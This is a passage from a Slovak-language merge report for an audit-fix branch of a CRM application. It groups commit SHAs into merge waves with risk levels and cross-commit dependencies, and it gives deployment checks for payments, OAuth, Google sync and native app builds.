| 17 | **S7** Server – Google Calendar a Google Tasks sync | 20 | stredné (sync, otestovať s reálnym Google účtom) | `e0178c19 19a69340 0132e7e6 b0924ad9 03b23c69 e1bd3c25 ec95ec2a 91660104 f5a30cd0 fa5fed1c bc1a91ea 9c867b0a 187761f4 8df08896 fc806fe6 cd6d92a0 37c40324 0c84f092 7377fe69 73effd68` |
| 18 | **S2** Server – admin API | 23 | nízke (len admin) | `4b76a838 20f5a206 c8ca61c6 31b9e35a 8fdb0973 af4f8fd2 f6fdd13a cdfa0217 3ae8434e bbe158c7 2f7cff7f c7be6796 cbd34ea0 8c94b243 239a2fd1 a94d1075 ca330705 ccde9da6 5561ec92 37a7ec4b c3be9a08 e84c0763 f062e206` |

**Poznámky k zlučovaniu:**

- Commit `4ef44dcc` (S3, zastavenie jobov pri shutdowne) volá `stopDueDateChecks` z časti S9 a `stop` z časti S8. Ak S3 zlúčite skôr, volania sú v `try/catch` a pri chýbajúcej funkcii sa ticho preskočia, nič nespadne.
- Pri klientských častiach `npm run build` prepíše sledované súbory v `client/dist` a `client/dev-dist`. Vráťte ich (`git checkout -- client/dist client/dev-dist`), build výstup necommitujte (viď nahlásený nález o sledovaných build artefaktoch).
- Po nasadení S9 skontrolujte, že časové pripomienky (napr. „15 min pred“) chodia v správny čas — dovtedy chodili o 1–2 h neskoro.
- Po nasadení S3 overte na Renderi premennú `CORS_ORIGIN`: teraz sa dá zadať aj ako zoznam oddelený čiarkou.

---

### Druhá vlna (84 commitov po `a0c9fbe`, po schválení všetkých opráv; posledný commit vetvy je tento REPORT)

Druhá vlna stojí na prvej — zlučujte ju až po nej. Commity druhej vlny na seba nadväzujú (tie isté súbory, napr. `server/models/User.js`, `server/routes/auth.js`, `server/index.js`), preto ich **zlučujte v chronologickom poradí** — buď celú vetvu naraz (PR `claude/audit-fixes` → `main`), alebo po úsekoch nižšie, vždy po predchádzajúcom úseku. Skúšobný cherry-pick po tematických skupinách mimo poradia **narazil na konflikty** (overené vo worktree); chronologické úseky sú presne história vetvy, takže konflikty nemajú. Pred úsekom V2 urobte kroky z kapitoly 7 A.

| # | Obsah | Commity | Riziko | SHA (v poradí cherry-pick) |
|---|---|---|---|---|
| V1 | Platby — Stripe klient, checkout, promo kódy, webhooky; affiliate provízie | 10 | stredné (platby — otestovať checkout a webhook v Stripe test mode) | `2306515 5180624 dfc34ae f63d1f3 20f64f0 3081bff fbc81a0 699e882 16c1774 eb86c81` |
| V2 | DB modely a indexy, rate limity, mazanie workspace, `tokenVersion` (zmena hesla odhlási relácie), validácia účtu, retry len idempotentných requestov, UserMenu, plánové limity, paidSeats | 10 | stredné (pred nasadením kapitola 7 A1–A2) | `5680212 050aada 0f6b950 57c98ad 6a30a0f 6702a3e b6a42d5 201f249 b983106 ce1b124` |
| V3 | OAuth väzba na prehliadač (nonce) + potvrdenie prepojenia účtov (server aj klient), Google Calendar/Tasks (podpísaný state, sync na pozadí, per-workspace kanály), stop() plánovačov | 13 | stredné (OAuth — otestovať Google/Apple login a prepojenie; Google sync s reálnym účtom) | `3e9a9d1 fbc01d9 814e42a 6439285 1a6b33f 5fdad60 2442e5a f6f83d7 557e539 deebf3a ca294fc cb60997 193b651` |
| V4 | Apple IAP (revokácie, unique väzba, retry ASSN), predplatné bez Apple, web push odbery, e-maily predplatného, admin (plán, promo, affiliate, recovery endpoint preč, počty) | 11 | stredné (IAP sandbox, admin) | `6e72629 d023226 3de60cd 0838919 ef63d5c 425553c 9e6e39b 5c1b550 a634b16 902fed6 1319ec5` |
| V5 | Limity podľa vlastníka, úlohy (multi-kontakt, duplikovanie, prílohy, streamovanie z R2), notifikácie, správy, prostredia/pozvánky, sanitizácia podúloh, stránky/push SSRF, kontaktný formulár, odhlásenie z e-mailov (POST), strop klientskych chýb, pripomienky bez prepisu, APNs HTTP/2, redundantné indexy, CSP pre statický web, skripty, affiliate maskovanie | 20 | stredné (kapitola 7 A3, B6–B7) | `0a558a2 5d22d4c 7118f15 b0ea8e6 6fbc02e e8d66e4 bb3f05a 5cabb3a 23e9472 72e1a7a 871b52e 37e610e bd823c9 e56e956 fd53cb5 ebd7d5e 8005b23 c79f343 d947b29 8237437` |
| V6 | Klient — zdieľaný socket, picker, promo expirácia, prílohy komentárov, výkon kariet, mŕtve komponenty, PDF na iOS, PII v promte, reset hesla, IAP stránka, PWA (start_url, orientácia, CTA, obnova chunku), dist mimo gitu, mŕtvy kód CRM | 14 | nízke–stredné (vizuálne + PWA otestovať) | `8711c3e 6fbc2ca 89ff7e9 1839e27 7bb64f8 7e8dabf e411788 eaf6c13 6505b42 f0719e5 e661489 b9f1c39 dde5f7c 24ca9bb` |
| V7 | Natívne appky — `prplcrm://auth` cez nonce (web), StoreKit finish až po /verify (web + Swift), iOS bezpečnosť a spoľahlivosť, iOS Info.plist/Privacy, Android bezpečnosť a spoľahlivosť | 5 | vysoké pre natívne buildy (nekompilované — kapitola 7 D); web časť nízke | `2cd5573 b7d41c6 54d3331 000f2e8 3841035` |
| V8 | Repozitár — osobný Xcode stav (xcuserdata) mimo gitu | 1 | žiadne | `3a51631` |

**Závislosti v rámci druhej vlny:**

- V3: serverová väzba OAuth (`3e9a9d1`) a klientská (`fbc01d9`) musia ísť do produkcie spolu (server aj web nasadiť v rovnakom okne).
- V2: `57c98ad` (server vracia nový token po zmene hesla) a `b6a42d5` (UserMenu ho uloží) spolu — inak sa používateľ po zmene hesla odhlási.
- V7: web časti (`2cd5573`, web časť `b7d41c6`) nasaďte **pred** vydaním nových natívnych buildov; staré buildy s novým webom fungujú. Commit `b7d41c6` mení signatúru v `StoreKitManager.swift`, ktorú používa `ContentView.swift` až v `54d3331` — iOS build skladajte z oboch.
- Pri klientských úsekoch už netreba vracať `client/dist` (od `dde5f7c` nie je v gite).
